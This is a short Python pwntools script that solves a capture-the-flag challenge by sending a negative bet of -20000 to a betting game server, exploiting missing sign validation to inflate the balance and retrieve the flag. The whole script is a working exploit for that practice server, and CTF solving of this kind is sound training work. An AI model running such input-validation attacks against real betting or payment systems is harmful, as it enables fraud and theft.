#!/usr/bin/env python3
from pwn import *
import re

# Connection details
HOST = "ctf.mf.grsu.by"
PORT = 9044

def solve():
    """Exploits the negative number vulnerability in the betting system."""
    conn = remote(HOST, PORT)

    # Read the initial banner
    conn.recvuntil(b'Your bet in game (0 - exit): ')

    # The server fails to validate that the bet is a positive number.
    # We can bet a large negative value. The server logic is likely:
    # 1. Check `if bet > bank` (e.g., -20000 > 2000 is False, so it passes)
    # 2. Update bank: `bank = bank - bet` (e.g., 2000 - (-20000) = 22000)
    # This immediately puts us over the 20000 nickel goal.
    
    bet = -20000
    log.info(f"Exploiting negative bet vulnerability. Sending bet: {bet}")
    conn.sendline(str(bet).encode())

    # Read all remaining output to get the flag
    log.success("Exploit sent! Receiving flag...")
    final_output = conn.recvall(timeout=5).decode()
    print(final_output)

    # Extract the flag for a clean finish
    flag_match = re.search(r'(junior\{\w+\})', final_output)
    if flag_match:
        log.success(f"Flag found: {flag_match.group(1)}")

    conn.close()

if __name__ == "__main__":
    solve()